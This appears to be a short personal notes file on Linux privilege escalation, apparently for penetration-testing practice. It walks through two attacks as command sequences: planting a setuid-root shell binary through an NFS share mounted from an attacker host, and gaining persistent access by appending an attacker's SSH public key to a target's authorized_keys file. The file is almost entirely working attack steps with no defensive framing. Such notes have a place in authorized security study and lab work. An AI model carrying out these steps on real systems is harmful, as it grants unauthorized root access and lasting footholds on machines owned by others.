	--see privesc_commands.txt in this directory for a quick and dirty list of nix privesc enumeration commands
	--let's focus here instead on service/configuraiton/common suid program targets and less obvious techniques



NFS
	(1) Create a suid binary as root from a remote (attacker-controlled) mountpoint
		On attacker host:
cd /mnt && mkdir mountpoint
mount -t nfs 10.11.1.111:/tmp mountpoint
chown root:root shell
chmod u+s shell
		On shelled host:
cd /tmp
./shell


SSH
	(1) add an arbitrary key to ~/.ssh/authorized_keys
		On attacker host:
ssh-keygen
cd .ssh
ls
xclip id_rsa.pub
		On shelled host:
xclip -o -sel clip >> authorized_keys
		On attacker host:
ssh -i id_rsa user@target.dom
